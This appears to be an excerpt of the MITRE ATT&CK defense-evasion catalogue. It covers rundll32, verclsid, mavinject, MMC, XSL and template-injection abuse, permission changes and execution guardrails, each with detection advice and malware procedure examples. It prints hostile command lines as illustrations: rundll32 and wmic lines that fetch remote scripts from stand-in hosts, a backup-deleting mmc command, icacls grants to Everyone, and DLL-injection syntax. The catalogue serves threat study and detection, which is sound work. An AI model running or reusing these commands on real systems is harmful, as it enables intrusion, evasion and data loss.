+Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks. Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1). Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.
+
+Procedures:
+
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group executed malware with `C:\\windows\system32\rundll32.exe "C:\ProgramData\ThumbNail\thumbnail.db"`, `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.
+- [S0260] InvisiMole: InvisiMole has used rundll32.exe for execution.
+- [C0021] C0021: During C0021, the threat actors used `rundll32.exe` to execute the Cobalt Strike Beacon loader DLL.
+- [S1160] Latrodectus: Latrodectus can use rundll32.exe to execute downloaded DLLs.
+- [S0196] PUNCHBUGGY: PUNCHBUGGY can load a DLL using Rundll32.
+- [S0635] BoomBox: BoomBox can use RunDLL32 for execution.
+- [S0045] ADVSTORESHELL: ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.
+- [S0204] Briba: Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.
+- [S0576] MegaCortex: MegaCortex has used rundll32.exe to load a DLL for file encryption.
+- [S1064] SVCReady: SVCReady has used `rundll32.exe` for execution.
+- [S0342] GreyEnergy: GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).
+- [S0142] StreamEx: StreamEx uses rundll32 to call an exported function.
+- [S0082] Emissary: Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.
+- [S0139] PowerDuke: PowerDuke uses rundll32.exe to load.
+- [S1190] Kapeka: Kapeka is a Windows DLL file executed via ordinal by `rundll32.exe`.
+- [S0256] Mosquito: Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.
+- [S0113] Prikormka: Prikormka uses rundll32.exe to load its DLL.
+- [S0554] Egregor: Egregor has used rundll32 during execution.
+- [G0047] Gamaredon Group: Gamaredon Group malware has used rundll32 to launch additional malicious components.
+- [S0518] PolyglotDuke: PolyglotDuke can be executed using rundll32.exe.
+- [S0081] Elise: After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.
+- [G0046] FIN7: FIN7 has used `rundll32.exe` to execute malware on a compromised network.
+- [G0073] APT19: APT19 configured its payload to inject into the rundll32.exe.
+- [S0438] Attor: Attor's installer plugin can schedule rundll32.exe to load the dispatcher.
+- [S1044] FunnyDream: FunnyDream can use `rundll32` for execution of its components.
+- [G0094] Kimsuky: Kimsuky has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.
+- [S0634] EnvyScout: EnvyScout has the ability to proxy execution of malicious files with Rundll32.
+- [S0483] IcedID: IcedID has used rundll32.exe to execute the IcedID loader.
+- [S1183] StrelaStealer: StrelaStealer DLL payloads have been executed via `rundll32.exe`.
+- [S0093] Backdoor.Oldrea: Backdoor.Oldrea can use rundll32 for execution on compromised hosts.
+- [C0015] C0015: During C0015, the threat actors loaded DLLs via `rundll32` using the `svchost` process.
+- [G0008] Carbanak: Carbanak installs VNC server software that executes through rundll32.
+- [G0022] APT3: APT3 has a tool that can run DLLs.
+- [G0059] Magic Hound: Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.
+- [G0127] TA551: TA551 has used rundll32.exe to load malicious DLLs.
+- [S1122] Mispadu: Mispadu uses RunDLL32 for execution via its injector DLL.
+- [S0255] DDKONG: DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.
+- [S0032] gh0st RAT: A gh0st RAT variant has used rundll32 for execution.
+- [S0461] SDBbot: SDBbot has used rundll32.exe to execute DLLs.
+- [G0108] Blue Mockingbird: Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.
+- [G0102] Wizard Spider: Wizard Spider has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.
+- [S0141] Winnti for Windows: The Winnti for Windows installer loads a DLL using rundll32.
+- [S0046] CozyCar: The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.
+- [S1052] DEADEYE: DEADEYE can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.
+- [G0050] APT32: APT32 malware has used rundll32.exe to execute an initial infection process.
+- [S1027] Heyoka Backdoor: Heyoka Backdoor can use rundll32.exe to gain execution.
+- [S1026] Mongall: Mongall can use `rundll32.exe` for execution.
+- [S0559] SUNBURST: SUNBURST used Rundll32 to execute payloads.
+- [S1039] Bumblebee: Bumblebee has used `rundll32` for execution of the loader component.
+- [G0032] Lazarus Group: Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.
+- [G0092] TA505: TA505 has leveraged rundll32.exe to execute malicious DLLs.
+- [S0606] Bad Rabbit: Bad Rabbit has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.
+- [S1050] PcShare: PcShare has used `rundll32.exe` for execution.
+- [G0052] CopyKittens: CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.
+- [G0096] APT41: APT41 has used rundll32.exe to execute a loader.
+- [S0381] FlawedAmmyy: FlawedAmmyy has used `rundll32` for execution.
+- [S1100] Ninja: Ninja loader components can be executed through rundll32.exe.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used `Rundll32.exe` to execute payloads.
+- [G0034] Sandworm Team: Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.
+- [G0007] APT28: APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe “C:\Windows\twain_64.dll”. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.
+- [S0268] Bisonal: Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”.
+- [G0125] HAFNIUM: HAFNIUM has used rundll32 to load malicious DLLs.
+- [S0452] USBferry: USBferry can execute rundll32.exe in memory to avoid detection.
+- [S1130] Raspberry Robin: Raspberry Robin uses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated with Tor nodes.
+- [S0147] Pteranodon: Pteranodon executes functions using rundll32.exe.
+- [C0028] 2015 Ukraine Electric Power Attack: During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using `rundll32.exe`.
+- [S0637] NativeZone: NativeZone has used rundll32 to execute a malicious DLL.
+- [S0074] Sakula: Sakula calls cmd.exe to run various DLL files via rundll32.
+- [S1196] Troll Stealer: Troll Stealer is dropped as a DLL file and executed via `rundll32.exe` by its installer.
+- [S0412] ZxShell: ZxShell has used rundll32.exe to execute other DLLs and named pipes.
+- [S0382] ServHelper: ServHelper contains a module for downloading and executing DLLs that leverages rundll32.exe.
+- [S0353] NOKKI: NOKKI has used rundll32 for execution.
+- [S0512] FatDuke: FatDuke can execute via rundll32.
+- [S0148] RTM: RTM runs its core DLL file using rundll32.exe.
+- [S0236] Kwampirs: Kwampirs uses rundll32.exe in a Registry value added to establish persistence.
+- [S0356] KONNI: KONNI has used Rundll32 to execute its loader for privilege escalation purposes.
+- [S0267] FELIXROOT: FELIXROOT uses Rundll32 for executing the dropper program.
+- [C0005] Operation Spalax: During Operation Spalax, the threat actors used `rundll32.exe` to execute malicious installers.
+- [S0589] Sibot: Sibot has executed downloaded DLLs with rundll32.exe.
+- [S0244] Comnie: Comnie uses Rundll32 to load a malicious DLL.
+- [S0568] EVILNUM: EVILNUM can execute commands and scripts through rundll32.
+- [G0082] APT38: APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.
+- [G1034] Daggerfly: Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary.
+- [S0520] BLINDINGCAN: BLINDINGCAN has used Rundll32 to load a malicious DLL.
+- [G1039] RedCurl: RedCurl has used rundll32.exe to execute malicious files.
+- [S0137] CORESHELL: CORESHELL is installed via execution of rundll32 with an export named "init" or "InitW."
+- [S0167] Matryoshka: Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.
+- [S0143] Flame: Rundll32.exe is used as a way of executing Flame at the command-line.
+- [G0140] LazyScripter: LazyScripter has used `rundll32.exe` to execute Koadic stagers.
+- [S0368] NotPetya: NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.
+- [S0154] Cobalt Strike: Cobalt Strike can use `rundll32.exe` to load DLL from the command line.
+- [S0044] JHUHUGIT: JHUHUGIT is executed using rundll32.exe.
+- [S0698] HermeticWizard: HermeticWizard has the ability to create a new process using `rundll32`.
+- [G0143] Aquatic Panda: Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.
+- [S0481] Ragnar Locker: Ragnar Locker has used rundll32.exe to execute components of VirtualBox.
+- [G0069] MuddyWater: MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.
+- [S0650] QakBot: QakBot has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication.
+- [C0037] Water Curupira Pikabot Distribution: Water Curupira Pikabot Distribution utilizes rundll32.exe to execute the final Pikabot payload, using the named exports `Crash` or `Limit` depending on the variant.
+- [S1030] Squirrelwaffle: Squirrelwaffle has been executed using `rundll32.exe`.
+- [S0250] Koadic: Koadic can use Rundll32 to execute additional payloads.
+- [C0018] C0018: During C0018, the threat actors used `rundll32` to run Mimikatz.
+
+### T1218.012 - System Binary Proxy Execution: Verclsid
+
+Description:
+
+Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell. Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.
+
+Procedures:
+
+- [S0499] Hancitor: Hancitor has used verclsid.exe to download and execute a malicious script.
+
+### T1218.013 - System Binary Proxy Execution: Mavinject
+
+Description:
+
+Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.
+
+Detection:
+
+Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity. Adversaries may rename abusable binaries to evade detections, but the argument INJECTRUNNING is required for mavinject.exe to perform Dynamic-link Library Injection and may therefore be monitored to alert malicious activity.
+
+### T1218.014 - System Binary Proxy Execution: MMC
+
+Description:
+
+Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration. For example, mmc C:\Users\foo\admintools.msc /a will open a custom, saved console msc file in author mode. Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems). Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\path\to\test.msc.
+
+Detection:
+
+Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as services.msc or eventvwr.msc. Invoking non-Microsoft .msc files may be an indicator of malicious activity.
+
+Procedures:
+
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda used Microsoft Management Console Snap-In Control files, or MSC files, executed via MMC to run follow-on PowerShell commands during RedDelta Modified PlugX Infection Chain Operations.
+
+### T1218.015 - System Binary Proxy Execution: Electron Applications
+
+Description:
+
+Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code. Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c calc.exe`). Adversaries may also execute malicious content by planting malicious JavaScript within Electron applications.
+
+Procedures:
+
+- [S1213] Lumma Stealer: Lumma Stealer as leveraged Electron Applications to disable GPU sandboxing to avoid detection by security software.
+
+
+### T1220 - XSL Script Processing
+
+Description:
+
+Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension. Command-line examples: * msxsl.exe customers[.]xml script[.]xsl * msxsl.exe script[.]xsl script[.]xsl * msxsl.exe script[.]jpeg script[.]jpeg Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch. Command-line examples: * Local File: wmic process list /FORMAT:evil[.]xsl * Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded. The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
+
+Procedures:
+
+- [S0373] Astaroth: Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.
+- [G0080] Cobalt Group: Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.
+- [G0126] Higaisa: Higaisa used an XSL file to run VBScript code.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.
+
+
+### T1221 - Template Injection
+
+Description:
+
+Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded. Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. Adversaries may also modify the *\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload. This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.
+
+Detection:
+
+Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior. Monitor .rtf files for strings indicating the &#42;\template control word has been modified to retrieve a URL resource, such as &#42;\template http or &#42;\template \u-.
+
+Procedures:
+
+- [G0035] Dragonfly: Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
+- [G0142] Confucius: Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.
+- [G0081] Tropic Trooper: Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.
+- [G0007] APT28: APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.
+- [C0001] Frankenstein: During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.
+- [G0047] Gamaredon Group: Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.
+- [S0631] Chaes: Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
+- [G0100] Inception: Inception has used decoy documents to load malicious remote payloads via HTTP.
+- [S0670] WarzoneRAT: WarzoneRAT has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.
+- [G0079] DarkHydrus: DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.
+
+
+### T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
+
+Description:
+
+Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied. Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.
+
+Detection:
+
+Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.
+
+Procedures:
+
+- [S0201] JPIN: JPIN can use the command-line utility cacls.exe to change file permissions.
+- [S0570] BitPaymer: BitPaymer can use icacls /reset and takeown /F to reset a targeted executable's permissions and then take ownership.
+- [S0531] Grandoreiro: Grandoreiro can modify the binary ACL to prevent security tools from running.
+- [G0102] Wizard Spider: Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.
+- [S0693] CaddyWiper: CaddyWiper can modify ACL entries to take ownership of files.
+- [S0446] Ryuk: Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.
+- [S1068] BlackCat: BlackCat can use Windows commands such as `fsutil behavior set SymLinkEvaluation R2L:1` to redirect file system access to a different location after gaining access into compromised networks.
+- [S0366] WannaCry: WannaCry uses attrib +h and icacls . /grant Everyone:F /T /C /Q to make some of its files hidden and grant all users full access controls.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware uses the `mountvol.exe` command to mount volume names and leverages the Microsoft Discretionary Access Control List tool, `icacls.exe`, to grant the group to “Everyone” full access to the root of the drive.
+- [S0612] WastedLocker: WastedLocker has a command to take ownership of a file and reset the ACL permissions using the takeown.exe /F filepath command.
+- [G1046] Storm-1811: Storm-1811 has used `cacls.exe` via batch script to modify file and directory permissions in victim environments.
+
+### T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+
+Description:
+
+Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode). Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.
+
+Detection:
+
+Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include chmod +x, chmod -R 755, and chmod 777. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.
+
+Procedures:
+
+- [G0139] TeamTNT: TeamTNT has modified the permissions on binaries with chattr.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via chmod.
+- [S0598] P.A.S. Webshell: P.A.S. Webshell has the ability to modify file permissions.
+- [S0599] Kinsing: Kinsing has used chmod to modify permissions on key files for use.
+- [S0402] OSX/Shlayer: OSX/Shlayer can use the chmod utility to set a file as executable, such as chmod 777 or chmod +x.
+- [S1105] COATHANGER: COATHANGER will set the GID of `httpsd` to 90 when infected.
+- [S1070] Black Basta: The Black Basta binary can use `chmod` to gain full permissions to targeted files.
+- [S0281] Dok: Dok gives all users execute permissions for the application using the command chmod +x /Users/Shared/AppStore.app.
+- [C0035] KV Botnet Activity: KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines.
+- [S0658] XCSSET: XCSSET uses the chmod +x command to grant executable permissions to the malicious file.
+- [G0106] Rocke: Rocke has changed file permissions of files so they could not be modified.
+- [G0050] APT32: APT32's macOS backdoor changes the permission of the file it wants to execute to 755.
+- [S0587] Penquin: Penquin can add the executable flag to a downloaded file.
+- [S0482] Bundlore: Bundlore changes the permissions of a payload using the command chmod -R 755.
+
+
+### T1480.001 - Execution Guardrails: Environmental Keying
+
+Description:
+
+Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment. Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs). Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.
+
+Detection:
+
+Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.
+
+Procedures:
+
+- [G0020] Equation: Equation has been observed utilizing environmental keying in payload delivery.
+- [G0096] APT41: APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.
+- [S0240] ROKRAT: ROKRAT relies on a specific victim hostname to execute and decrypt important strings.
+- [S1100] Ninja: Ninja can store its final payload in the Registry under `$HKLM\SOFTWARE\Classes\Interface\` encrypted with a dynamically generated key based on the drive’s serial number.
+- [S0260] InvisiMole: InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.
+- [S1145] Pikabot: Pikabot stops execution if the infected system language matches one of several languages, with various versions referencing: Georgian, Kazakh, Uzbek, Tajik, Russian, Ukrainian, Belarussian, and Slovenian.
+- [S0685] PowerPunch: PowerPunch can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.
+- [S0141] Winnti for Windows: The Winnti for Windows dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.
+
+### T1480.002 - Execution Guardrails: Mutual Exclusion
+
+Description:
+
+Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time. While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes. By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised. In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself. Mutex names may be hard-coded or dynamically generated using a predictable algorithm.
+
+Procedures:
+
+- [S1161] BPFDoor: When executed, BPFDoor attempts to create and lock a runtime file, `/var/run/initd.lock`, and exits if it fails using the specified file, resulting in a makeshift mutex.
+- [S1202] LockBit 3.0: LockBit 3.0 can create and check for a mutex containing a hash of the `MachineGUID` value at execution to prevent running more than one instance.
